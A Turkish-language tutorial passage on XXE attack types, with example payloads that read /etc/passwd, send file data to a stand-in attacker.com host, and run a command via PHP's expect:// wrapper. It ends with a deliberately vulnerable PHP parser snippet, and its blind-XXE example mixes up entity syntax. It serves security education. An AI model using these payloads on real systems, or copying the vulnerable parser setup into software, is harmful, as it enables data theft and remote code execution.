XXE saldırıları, saldırganın hassas bilgilere erişmesine veya sunucu üzerinde yetkisiz eylemler gerçekleştirmesine olanak tanıyabilecek çeşitli şekillerde gerçekleştirilebilir. XXE saldırılarının ana türleri şunlardır:

### 1. In-band XXE (Bant İçi XXE)

Bu, en yaygın XXE saldırı türüdür. Bu saldırıda, saldırgan, uygulamanın yanıtında hemen görünen harici bir varlık tanımlar. Bu, saldırganın sunucudan dosya sızdırmasına ve bunları doğrudan uygulama yanıtında görmesine olanak tanır.

Örnek:

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Bu örnekte,

xxe

varlığı

/etc/passwd

dosyasının içeriğini içerecek şekilde tanımlanmıştır. Uygulama bu XML'i işlediğinde,

/etc/passwd

dosyasının içeriğini yanıtında döndürecektir.

### 2. Out-of-band XXE (Bant Dışı XXE)

Bant dışı XXE saldırılarında, saldırgan, verileri doğrudan uygulama yanıtında alamaz. Bunun yerine, verileri kontrol ettikleri harici bir sisteme (örneğin, bir web veya DNS sunucusu) gönderirler. Bu, uygulamanın yanıtlarının ayrıntılı hata mesajları veya başka yararlı bilgiler içermediği durumlarda kullanışlıdır.

Örnek:

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo></foo>
```

evil.dtd

dosyası:

```auto
<!ENTITY % data "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%xxe;'>">
%data;
```

Bu örnekte,

/etc/passwd

dosyasının içeriği, saldırganın kontrolündeki bir sunucuya bir HTTP isteği aracılığıyla gönderilir.

### 3. Blind XXE (Kör XXE)

Kör XXE, bant dışı XXE'ye benzer, ancak saldırganın verileri sızdırmak için kullanabileceği doğrudan bir yan kanal yoktur. Bunun yerine, saldırgan, XML ayrıştırıcısının hata mesajlarını tetikleyerek veya uygulamanın davranışındaki ince değişiklikleri gözlemleyerek çıkarımlarda bulunur.

Örnek:

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///path/to/nonexistent/file">
]>
<foo>&xxe;</foo>
```

Bu örnekte, var olmayan bir dosyaya erişmeye çalışmak, uygulamanın bir hata mesajı döndürmesine neden olabilir. Saldırgan, bu hatanın varlığını veya yokluğunu gözlemleyerek sistem hakkında bilgi edinebilir.

### 4. Remote Code Execution (RCE) via XXE

Bazı durumlarda, XXE zafiyeti uzaktan kod yürütmeye (RCE) yol açabilir. Bu genellikle, sunucuda belirli bir modülün veya kütüphanenin yüklü olmasını gerektiren daha az yaygın bir senaryodur.

Örnek (PHP

expect

modülü): PHP

expect

modülü sunucuda yüklüyse, bir saldırgan

expect://

wrapper'ını kullanarak komutları yürütebilir.

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

Bu payload, sunucuda

id

komutunu çalıştırır ve çıktıyı uygulama yanıtında döndürür.

Aşağıda, bu zafiyeti barındıran bir PHP kodu örneği bulunmaktadır:

```auto
<?php
// expect modülünün yüklü olduğunu varsayalım
libxml_disable_entity_loader(false);

$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

$creds = simplexml_import_dom($dom);

$user = $creds->user;
echo "Hello " . $user;
?>
```

Bu kod,

libxml_disable_entity_loader(false)

ayarı nedeniyle XXE'ye karşı savunmasızdır ve

expect

modülü yüklüyse RCE'ye izin verir.
